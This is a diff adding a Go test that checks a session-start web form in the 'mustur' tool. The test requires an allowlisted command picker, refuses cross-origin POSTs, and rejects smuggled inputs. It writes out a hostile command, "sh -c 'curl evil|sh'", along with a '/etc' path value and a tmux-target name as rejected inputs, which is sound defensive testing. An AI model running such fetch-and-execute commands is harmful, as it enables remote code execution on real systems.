@@ -6,6 +6,7 @@ import (
 	"io"
 	"net/http"
 	"net/http/httptest"
+	"net/url"
 	"os"
 	"os/exec"
 	"path/filepath"
@@ -1598,5 +1599,102 @@ func TestATabWithoutThePopUpSaysItIsStale(t *testing.T) {
 	// Once, not on every frame: a screen frame arrives on every redraw.
 	if !strings.Contains(src, "toldStale") {
 		t.Error("the notice has no latch, so it would repeat on every frame")
+	}
+}
+
+// A session can be started from the surface, and nothing typed becomes a
+// process.
+//
+// MUS-Q-0079: a name, somewhere from the routing records, and a command from
+// an allowlist. `mustur session start --cmd` runs whatever it is given, so a
+// form with that field would be a shell behind Access.
+func TestStartingASessionTakesNoPathAndNoCommand(t *testing.T) {
+	ctx := context.Background()
+	st, err := store.Open(ctx, filepath.Join(t.TempDir(), "start.db"))
+	if err != nil {
+		t.Fatal(err)
+	}
+	t.Cleanup(func() { st.Close() })
+	dir := t.TempDir()
+	repo := record.Record{
+		ID: "MUS-R-0001", Kind: "repository", Title: "DevOfPie/Mustur", At: "2026-09-06",
+		Data: []record.Field{{Key: "Checkout on MUS-H-0001", Value: dir}},
+	}
+	if err := st.Append(ctx, repo, "create", "test"); err != nil {
+		t.Fatal(err)
+	}
+
+	a := &session.Adapter{Run: fakeRunner{listing: ""}}
+	s := &Sessions{Hub: &session.Hub{Adapter: a}, Adapter: a, Actor: "pie", Store: st}
+	mux := http.NewServeMux()
+	s.Routes(mux)
+	srv := httptest.NewServer(mux)
+	t.Cleanup(srv.Close)
+
+	body := getFrom(t, srv, "/sessions?new=1")
+	// The directory is offered, not asked for.
+	if !strings.Contains(body, `name="repo"`) || !strings.Contains(body, dir) {
+		t.Error("the form does not offer the checkout the store holds")
+	}
+	if strings.Contains(body, `name="dir"`) {
+		t.Error("the form asks for a path")
+	}
+	// The command is a list, never a text field.
+	if !strings.Contains(body, `<select name="cmd"`) {
+		t.Error("the command is not a picker")
+	}
+	if strings.Contains(body, `name="cmd" type="text"`) || strings.Contains(body, `<input type="text" name="cmd"`) {
+		t.Fatal("the command is a text field, which is a shell behind Access")
+	}
+	if !strings.Contains(body, ">claude<") {
+		t.Errorf("the default allowlist is not offered")
+	}
+
+	post := func(v url.Values, origin string) *http.Response {
+		t.Helper()
+		req, err := http.NewRequest(http.MethodPost, srv.URL+"/sessions", strings.NewReader(v.Encode()))
+		if err != nil {
+			t.Fatal(err)
+		}
+		req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
+		if origin != "" {
+			req.Header.Set("Origin", origin)
+		}
+		res, err := srv.Client().Transport.RoundTrip(req)
+		if err != nil {
+			t.Fatal(err)
+		}
+		res.Body.Close()
+		return res
+	}
+
+	good := url.Values{"name": {"Probe"}, "repo": {"MUS-R-0001"}, "cmd": {"claude"}}
+	// No Origin at all: refused, like the socket.
+	if res := post(good, ""); res.StatusCode != http.StatusForbidden {
+		t.Errorf("a POST with no Origin got %d, want 403", res.StatusCode)
+	}
+	// Another site: refused.
+	if res := post(good, "https://evil.example"); res.StatusCode != http.StatusForbidden {
+		t.Errorf("a cross-origin POST got %d, want 403", res.StatusCode)
+	}
+	// A command that is not on the list: refused, and the value is not echoed
+	// back onto the page.
+	bad := url.Values{"name": {"Probe"}, "repo": {"MUS-R-0001"}, "cmd": {"sh -c 'curl evil|sh'"}}
+	res := post(bad, srv.URL)
+	if res.StatusCode != http.StatusSeeOther {
+		t.Fatalf("a refused command got %d", res.StatusCode)
+	}
+	if loc := res.Header.Get("Location"); strings.Contains(loc, "curl") {
+		t.Errorf("the refused command was echoed into the redirect: %q", loc)
+	}
+	// A repository the store does not hold: refused, so no path can be smuggled.
+	unknown := url.Values{"name": {"Probe"}, "repo": {"/etc"}, "cmd": {"claude"}}
+	if res := post(unknown, srv.URL); res.StatusCode != http.StatusSeeOther {
+		t.Errorf("an unknown repository got %d", res.StatusCode)
+	}
+	// A name tmux would read as a target: refused by NameFor.
+	odd := url.Values{"name": {"a:b.c"}, "repo": {"MUS-R-0001"}, "cmd": {"claude"}}
+	if res := post(odd, srv.URL); res.StatusCode != http.StatusSeeOther {
+		t.Errorf("a name with tmux separators got %d", res.StatusCode)
 	}
 }
